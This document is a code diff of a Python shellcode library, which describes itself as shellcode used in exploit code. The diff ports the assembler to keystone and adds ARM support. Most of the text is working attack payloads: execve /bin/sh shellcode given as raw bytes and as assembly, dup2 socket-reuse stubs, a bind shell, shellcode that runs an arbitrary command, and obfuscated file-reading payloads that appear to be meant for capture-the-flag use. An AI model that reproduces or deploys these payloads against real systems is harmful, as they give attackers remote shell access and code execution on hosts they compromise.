@@ -3,185 +3,79 @@ from __future__ import print_function
 from struct import *
 from ctypes import *
 from capstone import *
-from subprocess import *
-import os
-import platform
+# use keystone-engine to compile asm code
+from keystone import * 
 # a collection of shellcode use regulary on exploit code.
+from SCUtils import *
 
-NOPs_X86 = '\x90'
+nop = '\x90'
 
-def xor_str(msg,key):
-	enc = []
+support_archs = [
+	'x86',
+	'x86_64',
+	'arm_thumb',
+	'arm_32',
+	'arm_64'
+]
 
-	for i,c in enumerate(msg):
-		enc.append(chr(ord(c) ^ ord(key[i % len(key)])))
-	return ''.join(enc)
+def asm(asm_code,arch):
+	# use to compile and extract your shellcode
+	if arch not in support_archs:
+		supported_arch = ','.join(support_archs)
+		msg = 'Your architecture %s is not valid. ' % arch
+		msg+= 'Own supported architectures are ' + supported_arch
+		raise Exception(msg)
 
-def stoh(host):
-	byte_s = ''
-	if host.count('.') == 3:
-		for p in host.split('.'):
-			byte_s += chr(int(p))
-	return byte_s
-
-def gen_key_pair(length,size_of_key):
-	key = []
-	for i in xrange(length):
-		tmp = os.urandom(size_of_key) # urandom size of each key
-		while '\x00' in tmp: # random key until '\x00' not in key
-			tmp = os.urandom(size_of_key)
-		key.append(tmp)
-	return key
-
-# ultilities function
-def num_add(v1,v2,mode):
-	uint = c_uint64 if mode else c_uint32
-	return uint(v1 + v2).value
-
-def num_sub(v1,v2,mode):
-	uint = c_uint64 if mode else c_uint32
-	return uint(v1 - v2).value
-
-def num_xor(v1,v2,mode):
-	uint = c_uint64 if mode else c_uint32
-	return uint(v1 ^ v2).value
-
-def _unpack(v,mode):
-	if mode:
-		return unpack('<Q',v)[0]
-	else:
-		return unpack('<I',v)[0]
-
-def _pack(v,mode):
-	if mode:
-		return pack('<Q',v)
-	else:
-		return pack('<I',v)
-
-def add_str(msg,key,mode = 0):
-	enc = []
-
-	# init offset
-	off = 8 if mode else 4
-
-	# padding message is multiple of 4 or 8
-	while len(msg) % off:
-		msg += os.urandom(1)
-
-	key = _unpack(key,mode)
-	for i in xrange(0,len(msg),off):
-		v = _unpack(msg[i:i+off],mode)
-		v1 = num_add(v,key,mode)
-		enc.append(_pack(v1,mode))
-
-	return ''.join(enc)
-
-def sub_str(msg,key,mode = 0):
-	enc = []
-
-	# init offset
-	off = 8 if mode else 4
-
-	# padding message is multiple of 4 or 8
-	while len(msg) % off:
-		msg += os.urandom(1)
-
-	key = _unpack(key,mode)
-	for i in xrange(0,len(msg),off):
-		v = _unpack(msg[i:i+off],mode)
-		v1 = num_sub(v,key,mode)
-		enc.append(_pack(v1,mode))
-
-	return ''.join(enc)
-
-def decrypt(cipher,key,step_funcs,mode = 0):
-	# init off
-	off = 8 if mode else 4
-
-	while len(cipher) % off:
-		cipher += '\x00'
-
-	msg = ''
-	key = _unpack(key,mode)
-
-	for i in xrange(0,len(cipher),off):
-		v = _unpack(cipher[i:i+off],mode)
-		for func in step_funcs:
-			v = func(v,key,mode)
-		msg += _pack(v,mode)
-
-	return msg
-
-# use to compile and extract your shellcode
-def asm(asm_code,arch='x86'):
 	sc = ''
-	nasm_path = ''
-	objcopy_path = ''
-	# getting config in Darwin system
-	if platform.system() == 'Darwin':
-		nasm_path = '/usr/local/bin/nasm'
-		objcopy_path = '/usr/local/bin/gobjcopy'
-	# getting config in Linux system
-	elif platform.system() == 'Linux':
-		nasm_path = '/usr/bin/nasm'
-		objcopy_path = '/usr/bin/objcopy'
+	try:
+		if arch == 'x86_64':
+			ks = Ks(KS_ARCH_X86, KS_MODE_64)
+		elif arch == 'x86':
+			ks = Ks(KS_ARCH_X86, KS_MODE_32)
+		elif arch == 'arm_thumb':
+			ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
+		elif arch == 'arm_32':
+			ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
+		elif arch == 'arm_64':
+			ks = Ks(KS_ARCH_ARM64, KS_MODE_ARM)
+		else:
+			supported_arch = ','.join(support_archs)
+			raise Exception('Own supported architectures are ' + supported_arch)
+
+		encoding,count = ks.asm(asm_code)
+		# convert list of byte code to a string
+		for byte in encoding:
+			sc += chr(byte)
+	except KsError as e:
+		print("ERROR: %s" %e)
+		return ''
 	else:
-		raise Exception('Unsupported operating system')
-
-	if not os.path.exists(nasm_path):
-		raise Exception('nasm is not installed')
-	if not os.path.exists(objcopy_path):
-		raise Exception('objcopy is not installed')
-
-	f = open('/tmp/shell.s','w')
-	f.write(asm_code)
-	f.close()
-
-	if arch == 'x86':
-		check_call([nasm_path, '-f','elf32','/tmp/shell.s','-o','/tmp/shell.o'])
-	elif arch == 'x86_64':
-		check_call([nasm_path, '-f','elf64','/tmp/shell.s','-o','/tmp/shell.o'])
-	else:
-		raise Exception('Unsupported architecture')
-
-	# compile success
-	if os.path.exists('/tmp/shell.o'):
-		# extract shellcode
-		check_call([objcopy_path,'-O','binary','--only-section=.text','/tmp/shell.o','/tmp/shell.bin'])
-
-	if not os.path.exists('/tmp/shell.bin'):
-		raise Exception('Some thing went wrong when extracted your shellcode')
-
-	f = open('/tmp/shell.bin','r')
-	sc = f.read()
-	f.close()
-	return Shellcode(sc,arch)
+		return Shellcode(sc,arch)
 
 class Shellcode(str):
-	mode = 0
-
-	def __new__(cls,content,mode = 0):
+	def __new__(cls,content,arch = 'x86'): # default architecture
 		obj = super(Shellcode,cls).__new__(cls,content)
-		if isinstance(mode,int):
-			obj.mode = mode
-		elif isinstance(mode,str):
-			if mode == 'x86':
-				obj.mode = 0
-			elif mode == 'x86_64':
-				obj.mode = 1
-			else:
-				raise Exception('Your mode is not support')
-		else:
-			raise Exception('Invalid Mode Setting')
+		# arch support verify must be change 
+		if arch not in support_archs:
+			raise Exception('Your architecture %s is not support' % arch)
+			
+		cls.arch = arch
+
 		return obj
 
 	# support disassembly feature
 	def disas(self):
 		md = None
-		if self.mode:
+		if self.arch == 'x86_64':
 			md = Cs(CS_ARCH_X86, CS_MODE_64)
-		else:
+		elif self.arch == 'x86':
 			md = Cs(CS_ARCH_X86, CS_MODE_32)
+		elif self.arch == 'arm_thumb':
+			md = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
+		elif self.arch == 'arm_32':
+			md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
+		elif self.arch == 'arm_64':
+			md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
 
 		if not md:
 			raise Exception('Unsupported Arch')
@@ -197,13 +91,13 @@ class Shellcode(str):
 		# add 2 Shellcode
 		if type(obj) is Shellcode:
 			# check architecture mode
-			if obj.mode == self.mode:
-				return Shellcode(str.__str__(self) + obj.__str__(),self.mode)
+			if obj.arch == self.arch:
+				return Shellcode(str.__str__(self) + obj.__str__(),self.arch)
 			else:
 				raise Exception('Difference Architecture Mode')
 		# add Shellcode with string
 		elif type(obj) is str:
-			return Shellcode(str.__str__(self) + obj,self.mode)
+			return Shellcode(str.__str__(self) + obj,self.arch)
 		else:
 			raise Exception('Invalid Type: obj must be a string or Shellcode')
 
@@ -216,7 +110,7 @@ class Shellcode(str):
 		# it will raise exeception.
 		if type(obj) is Shellcode:
 			# check mode of 2 objs, there objs must be the same
-			if obj.mode == self.mode:
+			if obj.arch == self.arch:
 				self = self + obj.__str__()
 				return self
 			else:
@@ -232,14 +126,38 @@ class Shellcode(str):
  
 class x86:
 	def dupsSock(self,fd=4):
-		dups = "\x31\xc9\x6a" + pack('<B',fd) + "\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
+		code = '''
+			xor ecx,ecx
+			push %d
+			pop ebx
+		loop:
+			push 0x3f
+			pop eax
+			int 0x80
+			inc cl
+			cmp cl,3
+			jne loop
+		'''
+		code = code % fd
+		dups = asm(code,'x86')
 		return Shellcode(dups)
 
 	def execveShell(self):
-		execve = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+		code = '''
+			push   	0xb
+			pop    	eax
+			cdq
+			push   	edx
+			push   	0x68732f2f
+			push   	0x6e69622f
+			mov    	ebx, esp
+			xor    	ecx, ecx
+			int    	0x80
+		'''
+		execve = asm(code,'x86')
 		return Shellcode(execve)
 
-	def execveShellBypassScanf(self):
+	def execveShellScanf(self):
 		# execve('/bin/sh') # use for scanf("%s")
 		execve = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70"
 		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
@@ -248,7 +166,7 @@ class x86:
 
 	def dupsExecve(self,fd=4):
 		# reuse socket fd and execve()
-		return self.dupsSock(fd) + NOPs_X86*10 + self.execveShell()
+		return self.dupsSock(fd) + nop*10 + self.execveShell()
 
 	def bindShell(self,port):
 		bindshell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
@@ -368,36 +286,55 @@ class x86:
 		return Shellcode(sc)
 
 	def alloca_stack(self):
-		return Shellcode('j\x01Y\xc1\xe1\x0b)\xcc')
+		code = '''
+			push 1
+			pop ecx
+			shl ecx,0xb
+			sub esp,ecx
+		'''
+		return Shellcode(asm(code,'x86'))
 
 	def jmp(self,offset):
 		offset = offset & 0xff
-		return Shellcode('\xeb' + chr(offset))
+		jmp = asm('jmp %d' % offset,'x86')
+		return Shellcode(jmp)
+
+	def jmp_addr(self,addr):
+		addr = addr & 0xffffffff # addr must be 4 bytes long
+		code = '''
+			push 0x%x
+			pop eax
+			jmp eax
+		'''
+		code = code % addr
+		return Shellcode(asm(code,'x86'))
 
 class x86_64:
 	def dupsSock(self,fd=4):
-		dups = "\x48\x31\xf6\x6a" + pack('<B',fd) + "\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
-		return Shellcode(dups,1)
+		dups = "\x48\x31\xf6\x6a"
+		dups+= pack('<B',fd)
+		dups+= "\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
+		return Shellcode(dups,'x86_64')
 
 	def execveShell(self):
 		execve = "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"
 		execve+= "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"
 		execve+= "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"
 		execve+= "\x42"
-		return Shellcode(execve,1)
+		return Shellcode(execve,'x86_64')
 
 	def execveSmallShell(self):
 		execve = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
 		execve+= "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
 		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
-		return Shellcode(execve,1)
+		return Shellcode(execve,'x86_64')
 
 	def dupsExecve(self,fd=4):
-		return self.dupsSock(fd) + NOPs_X86*10 + self.execveSmallShell()
+		return self.dupsSock(fd) + nop*10 + self.execveSmallShell()
 
 	def jmp(self,offset):
 		offset = offset & 0xff
-		return Shellcode('\xeb' + chr(offset),1)
+		return Shellcode('\xeb' + chr(offset),'x86_64')
 
 	def read_flag_enc(self,filepath):
 		key = gen_key_pair(4,4)
@@ -418,7 +355,7 @@ class x86_64:
 		read_flag = read_flag.replace('PPPP',key[3])
 		read_flag = read_flag.replace('concat',xor_str(filepath,key[3]))
 
-		return Shellcode(read_flag,1),key[0] + key[2] + key[1] + xor_str(xor_str(key[1],key[2]),key[0])
+		return Shellcode(read_flag,'x86_64'),key[0] + key[2] + key[1] + xor_str(xor_str(key[1],key[2]),key[0])
 
 	def read_flag_enc_2(self,filepath):
 		# generate keys
@@ -460,7 +397,7 @@ class x86_64:
 		enc_order = enc_flag_steps.keys()[ord(os.urandom(1)) % len(enc_flag_steps)]
 		sc = sc.replace('\x4c\x31\x0b\x4c\x01\x0b\x4c\x29\x0b',enc_order)
 
-		return Shellcode(sc,1),key_flag_enc,enc_flag_steps[enc_order]
+		return Shellcode(sc,'x86_64'),key_flag_enc,enc_flag_steps[enc_order]
 
 	def exec_enc_command(self,command):
 		'''
@@ -486,7 +423,7 @@ class x86_64:
 
 		sc = sc.replace('ls',xor_str(command + '\x00',xor_str(key[1] + key[0],key[3] + key[2])))
 
-		return Shellcode(sc,1)
+		return Shellcode(sc,'x86_64')
 
 	def exec_command(self,command):
 		sc = 'H1\xd2Rh//shh/binAYAXI\xc1\xe0 M\t\xc8APT_h\rC  XH5    PT^WYH\x83\xc1\x06R\xeb'
@@ -494,7 +431,7 @@ class x86_64:
 
 		sc = sc.replace('ls',command + ';')
 
-		return Shellcode(sc,1)
+		return Shellcode(sc,'x86_64')
 
 	def alloca_stack(self):
-		return Shellcode('j\x01YH\xc1\xe1\x0bH)\xcc',1)
+		return Shellcode('j\x01YH\xc1\xe1\x0bH)\xcc','x86_64')
